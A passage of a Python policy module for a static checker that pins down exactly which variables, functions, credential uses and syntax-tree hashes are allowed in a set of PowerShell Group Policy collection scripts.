# Automatic and preference variables. The engine reads them, so binding one
# changes how *other* statements behave ($PSDefaultParameterValues injects
# parameters into later calls; $PSModuleAutoLoadingPreference/$ErrorAction-
# Preference/...); a write is refused unless it is in SPECIAL_BINDINGS. Any
# variable named *Preference is treated the same way.
_SPECIAL_VARIABLES = frozenset(
    {
        "$",
        "?",
        "^",
        "_",
        "args",
        "consolefilename",
        "enabledexperimentalfeatures",
        "error",
        "errorview",
        "event",
        "eventargs",
        "eventsubscriber",
        "executioncontext",
        "false",
        "foreach",
        "formatenumerationlimit",
        "home",
        "host",
        "input",
        "iscoreclr",
        "islinux",
        "ismacos",
        "iswindows",
        "lastexitcode",
        "logcommandhealthevent",
        "logcommandlifecycleevent",
        "logenginehealthevent",
        "logenginelifecycleevent",
        "logproviderhealthevent",
        "logproviderlifecycleevent",
        "matches",
        "maximumaliascount",
        "maximumdrivecount",
        "maximumerrorcount",
        "maximumfunctioncount",
        "maximumhistorycount",
        "maximumvariablecount",
        "myinvocation",
        "nestedpromptlevel",
        "null",
        "ofs",
        "outputencoding",
        "pid",
        "profile",
        "psboundparameters",
        "pscmdlet",
        "pscommandpath",
        "psculture",
        "psdebugcontext",
        "psdefaultparametervalues",
        "psedition",
        "psemailserver",
        "pshome",
        "psitem",
        "psnativecommandargumentpassing",
        "psnativecommanduseerroractionpreference",
        "psscriptroot",
        "pssenderinfo",
        "pssessionapplicationname",
        "pssessionconfigurationname",
        "pssessionoption",
        "psstyle",
        "psuiculture",
        "psversiontable",
        "pwd",
        "sender",
        "shellid",
        "stacktrace",
        "switch",
        "this",
        "transcript",
        "true",
    }
)
# Never referenced at all (read or write): engine-wide parameter injection,
# module auto-loading, and the engine object itself.
FORBIDDEN_VARIABLE_REFS = frozenset(
    {"psdefaultparametervalues", "psmoduleautoloadingpreference", "executioncontext"}
)
# The only automatic/preference variable bindings the collectors make.
SPECIAL_BINDINGS: dict[str, frozenset[tuple[str, str]]] = {
    "Export-GpoEstate.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-GroupMembers.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-Principals.ps1": frozenset(
        {
            ("erroractionpreference", "= 'Stop'"),
            ("matches", "= [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')"),
            ("matches", "= [regex]::Matches($sddl, 'S-1-[0-9]+-[0-9-]+')"),
        }
    ),
    "Run-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
}
# A variable may be the root of an index write (`$h[$k] = ...`) only here.
INDEX_ASSIGNMENT_ROOTS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"principals", "groupmembers"}),
    "Export-GroupMembers.ps1": frozenset({"groupmembers"}),
    "Export-Principals.ps1": frozenset({"principals"}),
    "Run-GpoLensCollection.ps1": frozenset({"previous"}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# The only targets of variable-writing common parameters (literal names).
COMMON_PARAM_TARGETS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"zipenumerr", "srcerr"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# Exact set of functions each script defines. A redefinition (`function
# Assert-GpoLensRegularTree {}` later in the file) or a function shadowing an
# allowlisted cmdlet (`function Get-Item { ... }`) is not in the set.
LOCAL_FUNCTIONS: dict[str, tuple[str, ...]] = {
    "Export-GpoEstate.ps1": ("New-GpoExportZip", "Set-SectionProgress"),
    "Export-GroupMembers.ps1": (),
    "Export-Principals.ps1": (),
    "Run-GpoLensCollection.ps1": (
        "Write-GpoLensCollectionLog",
        "Get-GpoLensCompletedExports",
        "Assert-GpoLensRegularTree",
        "Assert-GpoLensCollectionOwner",
        "Invoke-GpoLensCollection",
    ),
    "GpoLensCollectionMarker.ps1": (
        "Read-GpoLensOwnerMarkerBytes",
        "Write-GpoLensOwnerMarkerBytes",
    ),
    "Register-GpoLensCollection.ps1": (
        "ConvertTo-GpoLensTaskArgument",
        "ConvertTo-GpoLensAbsolutePath",
        "Set-GpoLensCollectionOwner",
    ),
}
# SHA-256 of each local function's normalized syntax tree (the same row format
# as the golden, rooted at the FunctionDefinitionAst). HAND-MAINTAINED: the
# generator never writes this table (test_generator_never_writes_policy). Keys
# are function names; check_local_function_bodies compares casefolded.
LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "New-GpoExportZip": ("aacc73f36d374f73a77e565caf6883eb5c1e244669f3fa8d545e944be8315c25"),
        "Set-SectionProgress": ("452134c5d14fa82771a8f7e1cd085b3621ee16dc33457432f1f5b5db3ad82cc6"),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {},
    "Run-GpoLensCollection.ps1": {
        "Write-GpoLensCollectionLog": (
            "c063dec4d809ec58838c2f60022832f4e8bf67aaf839b70f54cba37b8214a36d"
        ),
        "Get-GpoLensCompletedExports": (
            "884c8f50670f56a5c6e432421ebd433981523bacbd5a0dea001c33d96f7f14cb"
        ),
        "Assert-GpoLensRegularTree": (
            "641bc5815235b9475ec326e3993752ac02a926fef931b616c15c68d99f802858"
        ),
        "Assert-GpoLensCollectionOwner": (
            "a9defc5b87009a3010dee3e57aecac76369ec4644c1cbae2472b236b9c981f7d"
        ),
        "Invoke-GpoLensCollection": (
            "3224d100fd66dae939805becde789ce6e7b51028adacdddd9163aa63cf1c3221"
        ),
    },
    "GpoLensCollectionMarker.ps1": {
        "Read-GpoLensOwnerMarkerBytes": (
            "fc4ea3b3baa91934c20ca92086e70949ef98073640aafd382a20a6437382b4e1"
        ),
        "Write-GpoLensOwnerMarkerBytes": (
            "85bacfbf2e5a9538af9b3ecbc60dbdcdfe8da9cef00a5b9a885e6dd0d3ccc9ca"
        ),
    },
    "Register-GpoLensCollection.ps1": {
        "ConvertTo-GpoLensTaskArgument": (
            "b21ec1b0406abf8920ffa137650660617e27a873b106c83e32db99e84df08699"
        ),
        "ConvertTo-GpoLensAbsolutePath": (
            "3167a68a6db407a4a1af18d6df9046eab0e70cb61a50e2950c93044b3b815ea0"
        ),
        "Set-GpoLensCollectionOwner": (
            "afb35b5aa433fc5611ac9dd1a2c1cb4ca4cd567b099ae0bdd4f6cc767bd4bb35"
        ),
    },
}

# Exact uses of secret-bearing variables (see check_secret_uses): (variable,
# enclosing function, normalized statement). HAND-MAINTAINED.
SECRET_USES: dict[str, tuple[tuple[str, str, str], ...]] = {
    "Export-GpoEstate.ps1": (),
    "Export-GroupMembers.ps1": (
        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop"),
    ),
    "Export-Principals.ps1": (
        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADDomain @adParams"),
        (
            "adparams",
            "",
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" -Properties '
                "nTSecurityDescriptor, displayName @adParams"
            ),
        ),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADDomain @adParams"),
        (
            "adparams",
            "",
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                "objectClass, sAMAccountName, name @adParams -ErrorAction Stop"
            ),
        ),
    ),
    "Run-GpoLensCollection.ps1": (),
    "GpoLensCollectionMarker.ps1": (),
    "Register-GpoLensCollection.ps1": (
        ("credential", "", "[Parameter(ParameterSetName = 'Service')] [pscredential]$Credential"),
        ("credential", "", "-not $Credential"),
        (
            "credential",
            "",
            (
                "$Credential = Get-Credential -UserName $ServiceAccount -Message "
                "'Collection task credentials (saved only by Windows Task "
                "Scheduler)'"
            ),
        ),
        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
        ("taskpassword", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
        ("credential", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
        (
            "taskpassword",
            "",
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
                "-User $ServiceAccount -Password $taskPassword -Force"
            ),
        ),
        ("taskpassword", "", "$taskPassword = $null"),
        ("credential", "", "$Credential = $null"),
    ),
}

# SHA-256 of each script's attributes + param block rows. HAND-MAINTAINED.
SCRIPT_HEADERS: dict[str, str] = {
    "Export-GpoEstate.ps1": ("6dbe34329001a4e2fe1c85e31716c69c9253ba4cbda2b9f10d8ed297910ffdb7"),
    "Export-GroupMembers.ps1": ("49a4d9070b03f9ca32a4e281eb1a8ae4b106eda3ae7e94573b508dc50c6c30e5"),
    "Export-Principals.ps1": ("dfa22517b497f3eeafb9a18678ff7495e2bcd72c74bce468b6beb89862d6efd4"),
    "Run-GpoLensCollection.ps1": (
        "874b6828b646e8479ce7408283e78169b4c84b4f8c03d9445ed230d941bbe733"
    ),
    "GpoLensCollectionMarker.ps1": (
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ),
    "Register-GpoLensCollection.ps1": (
        "98c57e75887fbdc508701b1c27836d9a5566b4d7fd0842b689650eb66a6a5036"
    ),
}

# Per-statement subtree digests (see check_statement_digests). HAND-MAINTAINED,
# generated by scripts/print_statement_digests.py; the generator never writes it.
# Expression-valued pipeline inputs (see check_pipeline_inputs). HAND-MAINTAINED.
PIPELINE_INPUTS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "Export-GpoEstate.ps1": (
        (
            (
                "@($allGpc | ForEach-Object { [pscustomobject]@{ Id = $_.Name.Trim('{}'); "
                "DisplayName = $_.displayName } })"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$allGpc",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "'[]'",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "$collectionErrors",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "$allGpos",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$g.InheritedGpoLinks",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$inh",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$allSids",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
            ),
        ),
        (
            "$allSids",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$principalsOut",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$principals.Keys",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$members",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "$groupMembersOut",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$collectionErrors",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "$collectionErrors",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
    ),
    "Export-GroupMembers.ps1": (
        (
            "$principalsData.principals.PSObject.Properties",
            (),
        ),
        (
            "$out",
            (),
        ),
    ),
    "Export-Principals.ps1": (
        (
            "$allSids",
            ("foreach ($sid in $allSids | Sort-Object)",),
        ),
        (
            "$allSids",
            (),
        ),
        (
            "$out",
            (),
        ),
    ),
    "Run-GpoLensCollection.ps1": (
        (
            "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$_",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
    ),
    "GpoLensCollectionMarker.ps1": (),
    "Register-GpoLensCollection.ps1": (),
}


STATEMENT_DIGESTS: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        # [0] FunctionDefinitionAst: ExportPath
        "0": "31065097e496281b1a4e7e4404fea81e731634905ed6aee741918f951ac85182",
        # [0/0] PipelineAst: Add-Type
        "1": "b2e85368393588a88968512ff6e3faf613ce9ac365181ab9baef5529db0a7673",
        # [0/1] AssignmentStatementAst: archive
        "2": "c2a61ac62a7d736802b4d576517d0890091125863eed4d9d2c1706659d5ae021",
        # [0/2] TryStatementAst: Test-Path
        "3": "9567cc697a2cfc12f696d7ab17637b7f2e63b56c446d2872467df940cd58e82d",
        # [0/2/0] IfStatementAst: Test-Path
        "4": "d025e7ab9b3186c308937aacc74accd2a33cffb54241199e1f68721cdc1f490b",
        # [0/2/0/0] PipelineAst: Remove-Item
        "5": "5415b1b6ca6706274923914adb875adfaa3a7c05d2d1c0e1af2fd65a010ce806",
        # [0/2/1] AssignmentStatementAst: zipEnumErr
        "6": "5e8f465d04cb16882bd257a70f3ac38b37a93193a29151a6c1b781a35a4e4ec0",
        # [0/2/2] AssignmentStatementAst: diskFiles
        "7": "236f52cf165c61bc7349c6a30af762901fe8aa6d403e4e13bf559abd298b364f",
        # [0/2/2/0] PipelineAst: Get-ChildItem
        "8": "3d35547e005e310c2892f01c3a86fb22e421ef402b81920c4298cd00d5af6bd1",
        # [0/2/3] IfStatementAst: zipEnumErr
        "9": "b703afe1b49706cda5e5be2f4687afbd67a3e8038c6234e661fcd48975a85c2f",
        # [0/2/3/0] ThrowStatementAst: $($zipEnumErr.Count) file enumeration error(s); the export c
        "10": "3329fb5850e9151aa4fb2f5a4dc52b68adac3399c2f67d2bcaf1477b2b7950e1",
        # [0/2/3/0/0] PipelineAst: zipEnumErr
        "11": "a7f1f3623f5945006113f9e5e6aa16487ae9d19fb63b8a09aa24f84bbc31fbfc",
        # [0/2/4] AssignmentStatementAst: zip
        "12": "042b1695e284db77933e04f50e27d11293a945564260529eb56a524c9448c7c5",
        # [0/2/5] TryStatementAst: rootLen
        "13": "e9578121c74427a812a128e93ff92da93e250f0ee0fb70fb45cbc5c6824784d9",
        # [0/2/5/0] AssignmentStatementAst: rootLen
        "14": "db9c344cd1f7628b025a96c118b0ddf9a8a99e9f279872cfa3bc205e562f2671",
        # [0/2/5/1] ForEachStatementAst: f
        "15": "37392476089116a601b8bba1968b97a7f3e85dc0959ee86b356d6f74078bf8bd",
        # [0/2/5/1/0] AssignmentStatementAst: entryName
        "16": "93c352725edf5c15de2dc78cd49dd3f37e8ab82da0a75653037a1e8b3fb7c25d",
        # [0/2/5/1/1] PipelineAst: CreateEntryFromFile
        "17": "a6d5ebe810ea75e27bafda15c90e0a011330ce2892b6629f6628d258482d7b73",
        # [0/2/5/0] PipelineAst: zip
        "18": "9daf1fbe7925244c67e74e2096f964cf9d4284d59f85bd4aec668c8e9a29f6e8",
        # [0/2/6] PipelineAst: Write-Host
        "19": "311a8eb1fb1e65f01a4c7955be6c6d794c6304d3514e4dd6b9ef0e977a5be21d",
        # [0/2/6/0] PipelineAst: diskFiles
        "20": "439f23e5adda5902153eaf29c1c7e5d10d41d071a6f749f9c8190e47c7ddd108",
        # [0/2/0] IfStatementAst: Test-Path
        "21": "d025e7ab9b3186c308937aacc74accd2a33cffb54241199e1f68721cdc1f490b",
        # [0/2/0/0] PipelineAst: Remove-Item
        "22": "5415b1b6ca6706274923914adb875adfaa3a7c05d2d1c0e1af2fd65a010ce806",
        # [0/2/1] ThrowStatementAst: ZIP creation failed: $($_.Exception.Message)
        "23": "0ca48f3d7ed645351420d5a83cf7d82bc94df9a0b515d18fc02b6270ec7a1f6d",
        # [0/2/1/0] PipelineAst: _
        "24": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [1] AssignmentStatementAst: ErrorActionPreference
        "25": "377020eb96957a66bcf052c8123be641902cb0ebb4315a09718a476a4ca5aa59",
        # [2] ForEachStatementAst: mod
        "26": "252837e86db66b0f20ccd69a6e3373c035e8f6efdacf2e3541d8dde56e2a2164",
        # [2/0] PipelineAst: GroupPolicy
        "27": "54cc4e2a05e34df5316df6194b313d58dd8299c2294e5b5ee333a9f594561242",
        # [2/0] IfStatementAst: Get-Module
        "28": "86e08c1fa5b5e5c10712e2215eb58959349ac54c400d86b2a1d91be3fe81f877",
        # [2/0/0] PipelineAst: Write-Error
        "29": "43ebcac7e1f467e5b6665ee02f3ae990ed8d7467d4d81190dc33b54c232ed817",
        # [3] TryStatementAst: Test-Path
        "30": "13664804f2ad522f4aeda4cda055f07ed6de5a773dea29439ea39c42762c882d",
        # [3/0] IfStatementAst: Test-Path
        "31": "be1e51c1cb73ba58fd646ec38c79a952176351bc18f12c9e6264e8fa3cd6162a",
        # [3/0/0] PipelineAst: New-Item
        "32": "914dd7e67674d64c4dedf05305ba5519a2b9773c71f4d5a24e0e08e2ab8e59ba",
        # [3/1] AssignmentStatementAst: testFile
        "33": "4d4529f85b86bee7b2a9eda19694230a6fb35b7c97155508d2f4ebb20ae64e28",
        # [3/2] PipelineAst: WriteAllText
        "34": "1e01d3d18c8c6b8c5fb1edec3b18df283e6e7326c1c03d64516de06d6f877c77",
        # [3/3] PipelineAst: Remove-Item
        "35": "d8a8ed22202e48663af9b10d4d6ce2ddd73b60aef4709b9be88351d42136d491",
        # [3/0] PipelineAst: Write-Error
        "36": "2054cdf90e4b5cc352ee199cf32a7a4f4e9b6fc45704034f7ca13423757c1f91",
        # [3/0/0] PipelineAst: _
        "37": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [4] AssignmentStatementAst: dom
        "38": "0ff7bab901025462c33eafe612bc40bcac8fdfe06650661a1ab1e7d5d10e775d",
        # [5] AssignmentStatementAst: stamp
        "39": "05a17c0390089f8b621d3f218558f365bc7f34bac796ff7255520112efa34a5d",
        # [6] AssignmentStatementAst: out
        "40": "1d7af5b9f13a04e6823ff746616126d9743fe06824e6f0490d2807d76063b93c",
        # [6/0] PipelineAst: dom
        "41": "e8720f95f076b1e759f3900afa4fa1ea499a611ab2ffe4ae37c4bbecfd9682aa",
        # [7] AssignmentStatementAst: allGpos
        "42": "c727a0bef243f3a08f61de8f027387170d927b5bbf867e403951be240c45692f",
        # [8] AssignmentStatementAst: gpoCount
        "43": "40c2c5e3f6a4039a85d6dc7ee612c7d37ff30779e6922fc9ba8abdc6309416b7",
        # [9] AssignmentStatementAst: ouCount
        "44": "d1e9647987caadd37763b7200a937568373565c12a7ec42da04a9dc5b0d678ab",
        # [9/0] PipelineAst: Get-ADOrganizationalUnit
        "45": "cee69af015ffebea2fb972b287e6e9647c4ff2f201fed88144c31d9629721545",
        # [10] AssignmentStatementAst: wmiCount
        "46": "7851116166d7364bbe6361566fc8987a45e88fc7b5ef69d8e4491029c260e3ae",
        # [10/0] PipelineAst: Get-ADObject
        "47": "1a74f24e4b4a5506a0bc6b7ab0581e49231602165f84343f212c26575de1905b",
        # [11] AssignmentStatementAst: siteCount
        "48": "7ba7c73afa7b9eb3a4261e8a2963e8178ce8b9c95476a21fa6eef8e2ac347e0f",
        # [11/0] PipelineAst: Get-ADObject
        "49": "a9aba8a4f7087d0bccf6e957131864cb97adf49e4119bd5576a1e076b4b56027",
        # [11/0/0] PipelineAst: Get-ADRootDSE
        "50": "d28bdf226b7426ffe39db3fd18d626975b753ef1d1022d90429da5ae0c1004a1",
        # [12] IfStatementAst: DryRun
        "51": "9af0cddf6cab9165f559cd6ed3c9623606e4caddc783f201be5e060eab40d7ec",
        # [12/0] AssignmentStatementAst: sysvolSizeStr
        "52": "63f09a09ee80dbc0065e234cb508b361d1283a27a6b6f895a87f5679f4717316",
        # [12/1] IfStatementAst: SkipSysvol
        "53": "93a8a97351f1707215c42611b8c55075b2cc34681d18863a7ba1f2956246b62a",
        # [12/1/0] AssignmentStatementAst: src
        "54": "b2f385e70cb1e1d48e8f83f29ef0485de7227ad44ec1346c64b5519aa69dbcd7",
        # [12/1/0/0] PipelineAst: dom
        "55": "e8720f95f076b1e759f3900afa4fa1ea499a611ab2ffe4ae37c4bbecfd9682aa",
        # [12/1/0/0] PipelineAst: dom
        "56": "e8720f95f076b1e759f3900afa4fa1ea499a611ab2ffe4ae37c4bbecfd9682aa",
        # [12/1/1] AssignmentStatementAst: sysvolSize
        "57": "7a3bb5c2bfab8998b8e8c8415727b85b7e197b7b1e203b68e42a510ce19cdb41",
        # [12/1/2] AssignmentStatementAst: sysvolSizeStr
        "58": "bb1f2419337672beeb7a7df1b0c3a272acbf43d8a7eb8c32fc8281f5a261ca70",
        # [12/1/2/0] PipelineAst: Round
        "59": "eec3dd460248bed102121159050379d363201a206217e75bcd4e19dbb0d7bfb2",
        # [12/2] PipelineAst: Write-Host
        "60": "76d740ee6665c52292e7cd8ad54094f97c57e9bd2123fc295b9c7fce8ce27cb8",
        # [12/3] PipelineAst: Write-Host
        "61": "77361870aa5c08255444c23991ef7a5c8c7318bf6f05f3bc7a7e9a705d59fd4b",
        # [12/3/0] PipelineAst: dom
        "62": "e8720f95f076b1e759f3900afa4fa1ea499a611ab2ffe4ae37c4bbecfd9682aa",
        # [12/4] PipelineAst: Write-Host
        "63": "83213685d474c7afbda2c95e3b550bf4f91cc4b4a5167eb1701cababb0a0df21",
        # [12/5] PipelineAst: Write-Host
        "64": "024efdcbc802d2342806185a0c57b47255f680bed974032de2f77a2a4bad60f5",
        # [12/6] PipelineAst: Write-Host
        "65": "bd3b42fb636f03d8d03d080f372ef8063b6ca7118b03412020a2e0ea20cfcc97",
        # [12/7] PipelineAst: Write-Host
        "66": "a6d18427460b18d6f48a849313a813577dca6f027b6964ae9214512374cdcad7",
        # [12/8] PipelineAst: Write-Host
        "67": "0fdc54f7c8fe35b04cb3443eb975813c9cebf22601e35deebdd1c87899fabcd8",
        # [12/9] PipelineAst: Write-Host
        "68": "46b5ae0ba0e7aaf6c3cf1f9eba7e0aa5da57521ca213c069bea80e372fe7a631",
        # [12/9/0] IfStatementAst: SkipSysvol
        "69": "45bf217d3209b5cc06241d62cef254e347a2ced3265a94ce0fda4ad38bf3cf4b",
        # [12/9/0/0] PipelineAst: skipped
        "70": "be48ab43ce4d02c11d941bbe97e682c98a0f715b6616766b0f238c3f95797714",
        # [12/9/0/0] PipelineAst: sysvolSizeStr
        "71": "20f913956b80ee5f2c6498ebe1923c9a33321031808e8e5fab68443f1a821005",
        # [12/10] PipelineAst: Write-Host
        "72": "e6305f0122e7e5be619a5f44a35d37bfa79d951f7e18f24940411dab7854b39e",
        # [12/10/0] IfStatementAst: NoZip
        "73": "1084bf145391d0e14152ee0ad56c4e81dca060f0411694865def7157cfb62f84",
        # [12/10/0/0] PipelineAst: skipped
        "74": "be48ab43ce4d02c11d941bbe97e682c98a0f715b6616766b0f238c3f95797714",
        # [12/10/0/0] PipelineAst: $out.zip
        "75": "21db3614ff3d5789929ff3d87be719cc0cfbd3a6816671331c42a269171f0ff2",
        # [12/11] ReturnStatementAst:
        "76": "6e6746dffbb548873b35171401118f89ee86d15e33675b92982f74752b9bb1c7",
        # [13] PipelineAst: New-Item
        "77": "ea1a730940aea884ad26558302c04b97427f1f6302dc6bacb8f8fb40c853e1cd",
        # [14] PipelineAst: Write-Host
        "78": "c26902d9d8e48c120b9ccbde86435b91d27c530e8a9d966436dd6e9731d40426",
        # [14/0] PipelineAst: dom
        "79": "e8720f95f076b1e759f3900afa4fa1ea499a611ab2ffe4ae37c4bbecfd9682aa",
        # [15] AssignmentStatementAst: successSections
        "80": "8ef2a55a81dda8059a59629653ee84fbc8f571b114e6cd97d80c388ff774d536",
        # [16] AssignmentStatementAst: failedSections
        "81": "671d0570bc57d4efe7692186b6b5afb49f006c2c13a2ba89c34b60db9d3e8a25",
        # [17] AssignmentStatementAst: totalSections
        "82": "2f5f7722a66274a54f8e091c2f66a0641ee01884b4aeff947721a95364658f27",
        # [18] AssignmentStatementAst: sectionNum
        "83": "6f3a5a8a0cee145eb2fb7f01313c5321e359bceb8c877fe5cdd07b1bd0fedce3",
        # [19] FunctionDefinitionAst: Activity
        "84": "e145d458a9ac5e25a0c69ee190e3d7bf15e08f61d5e2241e93331c1ecbb0bc98",
        # [19/0] AssignmentStatementAst: pct
        "85": "708391643371ca14dca3d40011f28ab10058ade54fe4108f0b663545c345687e",
        # [19/1] PipelineAst: Write-Progress
        "86": "ece77365be5f229a76bdedc61b0add6e60ea6f3eb391c7db61f8558c0181afce",
        # [20] PipelineAst: sectionNum
        "87": "098867519b53125fa0d6a777d3023f228cd028efa3328df7e15b5c1ee4277a63",
        # [21] PipelineAst: Set-SectionProgress
        "88": "b0e65e13b19d8461e24d74b9c4ede1860288306c928a1362cc9078f618a98657",
        # [22] AssignmentStatementAst: collectionErrors
        "89": "5cf78dbba998d774689b8d8efe65574a6c3fbfb61c4fd3d63b478c3cd2007e46",
        # [23] TryStatementAst: Get-GPOReport
        "90": "39604d13173d4117c31a3abbf9fba7194e22dd92747e4fe930456067ceed561e",
        # [23/0] PipelineAst: Get-GPOReport
        "91": "92e92bb1dbd1a8bb5792c42da2578c0cee6e816dbb693c3959ea3c24ff531ae4",
        # [23/0] PipelineAst: collectionErrors
        "92": "e51820debf87785fabc2786a835f24b039a3ed755f67dc6f7e68387a7805a87d",
        # [23/1] PipelineAst: Write-Warning
        "93": "9c0a08b44a593a8457425cb51f5e40f10d66dbe8cb9a7d8cb66d0e9ec5217fa3",
        # [23/1/0] PipelineAst: _
        "94": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [24] AssignmentStatementAst: i
        "95": "b041fc6c27ee2a7b0e2d8fdd71fab98ee4c3ebea243be64b1d8c3e167a7d1a8e",
        # [25] ForEachStatementAst: gpo
        "96": "01485c34a7b8b4b6f562e652a8c2d58619f9358777addbbf0aa083dfe8641c4c",
        # [25/0] PipelineAst: i
        "97": "bef25a6604df99d7d387019fd3e6d45267d160ee3408105368e7c1b55a1a50a2",
        # [25/1] PipelineAst: Write-Progress
        "98": "4cc9a85643f6808e86dc806d83c478a76bbfbb67ee44e5ca7125b1f892ee66cf",
        # [25/2] AssignmentStatementAst: safe
        "99": "135d72681aee6dc77059a583499ece74bbc3b3bd908d2532be717dd26b6ffa1a",
        # [25/3] TryStatementAst: Get-GPOReport
        "100": "4b5c2c7095800830b6c146f68a73e4d2390a60e137125dd62d16694ccf74b4b5",
        # [25/3/0] PipelineAst: Get-GPOReport
        "101": "279f4714c3bb59a0c9a172466071e05d01b79636feeba1aad29323bac228d41c",
        # [25/3/0/0] PipelineAst: gpo
        "102": "12da7fdc0707186d25358400618a663424f3b8de7c17582f96599ece75779747",
        # [25/3/0] PipelineAst: collectionErrors
        "103": "a22cfb313d83796b1e4b8195b7739009ce45ede81ae9d14e13684a10e4131f1d",
        # [25/3/1] PipelineAst: Write-Warning
        "104": "4a5ee1f3a82c8de660a794f4d9fad840367262e7e00a9889956d8ec17fb7cba3",
        # [25/3/1/0] PipelineAst: gpo
        "105": "d4c2967846f0bdb9b1d96880fe8b3384c8331c3c1d8d5b3c61b6769508ff7ad6",
        # [25/3/1/0] PipelineAst: gpo
        "106": "12da7fdc0707186d25358400618a663424f3b8de7c17582f96599ece75779747",
        # [25/3/1/0] PipelineAst: _
        "107": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [26] TryStatementAst: policiesDN
        "108": "3faa90cbc927e835e8763c80b2b63622f64bbf46b8234a3f3943a6f792a54615",
        # [26/0] AssignmentStatementAst: policiesDN
        "109": "0b252c762e43df9a93951c033885eada51c82d382b8d17851b51de638402820d",
        # [26/0/0] PipelineAst: dom
        "110": "eba48f075999db2cc5ebff1cffff652e45790e7354d437d3ea401cbaba38589e",
        # [26/1] AssignmentStatementAst: allGpc
